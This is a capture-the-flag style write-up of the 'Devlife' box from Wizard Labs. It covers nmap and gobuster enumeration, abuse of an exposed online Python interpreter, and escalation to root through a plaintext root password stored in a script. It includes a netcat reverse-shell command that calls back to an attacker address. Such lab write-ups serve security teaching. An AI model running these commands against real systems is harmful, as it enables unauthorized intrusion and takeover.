<hr />

<h2 id="quick-summary">Quick Summary</h2>
<p><br /> Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like <a href="/wizard-labs/dummy/">dummy</a> it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is <code class="highlighter-rouge">10.1.1.20</code> so let’s jump right in !
<img src="/images/wizardlabs/devlife/0.png" alt="" /></p>
<hr />

<h2 id="nmap">Nmap</h2>
<p><br /> We will start with nmap to scan for open ports and services : 
<code class="highlighter-rouge">nmap -sV -sT -sC 10.1.1.20</code>
<img src="/images/wizardlabs/devlife/1.png" alt="" />
<br /> Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http.</p>
<hr />

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br /> On the main page we get this “About me” message and nothing else :
<img src="/images/wizardlabs/devlife/2.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>About Me

Hello , My name is Teddy Smith , I am a Python developer since 2007 !

Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !!

Stay Tuned ...

TS

</code></pre></div></div>
<p><br /> I ran <code class="highlighter-rouge">gobuster</code> with <code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and got these results :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/dev (Status: 301)
/index.html (Status: 200)
/manual (Status: 301)
/server-status (Status: 403)
</code></pre></div></div>
<p><br /></p>
<hr />

<h2 id="getting-user">Getting user</h2>
<p><br /> So I checked <code class="highlighter-rouge">/dev</code> and found this <code class="highlighter-rouge">Online Python 2.7 Interpreter</code> :
<img src="/images/wizardlabs/devlife/3.png" alt="" />
<br /> Great , now we can get a reverse shell in many ways , I just imported <code class="highlighter-rouge">os</code> then did <code class="highlighter-rouge">os.system(reverse shell payload)</code> :
<code class="highlighter-rouge">import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337')</code>
<img src="/images/wizardlabs/devlife/4.png" alt="" />
<br />
<br />
<img src="/images/wizardlabs/devlife/5.png" alt="" />
<br /> And we owned user !
<br /></p>
<hr />

<h2 id="stored-root-credentials--privilege-escalation">Stored root Credentials , Privilege Escalation</h2>
<p><br /> In the <code class="highlighter-rouge">/home</code> directory of <code class="highlighter-rouge">tedd</code> there is a directory called <code class="highlighter-rouge">.env</code> , Let’s check that.
<img src="/images/wizardlabs/devlife/6.png" alt="" />
<br />
<br />
<img src="/images/wizardlabs/devlife/7.png" alt="" />
<br /> We notice a python script called <code class="highlighter-rouge">su.py</code> , which runs <code class="highlighter-rouge">su root</code> and uses the password to authenticate :
<img src="/images/wizardlabs/devlife/8.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pexpect
child = pexpect.spawn('su root')
child.expect ('Password:')
child.sendline('teddyxy2019')
child.expect('\$')
child.sendline('whoami')
</code></pre></div></div>
<p><br /> Now we can <code class="highlighter-rouge">su</code> to root using the password <code class="highlighter-rouge">teddyxy2019</code> :
<img src="/images/wizardlabs/devlife/9.png" alt="" />
<br /> And we owned root !
<br />
<br />
<br /> That’s it , Feedback is appreciated !
<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
<br /> Thanks for reading.
<br /> Previous Wizard Labs Write-up : <a href="/wizard-labs/dummy/">Wizard Labs - Dummy</a></p>
<hr />

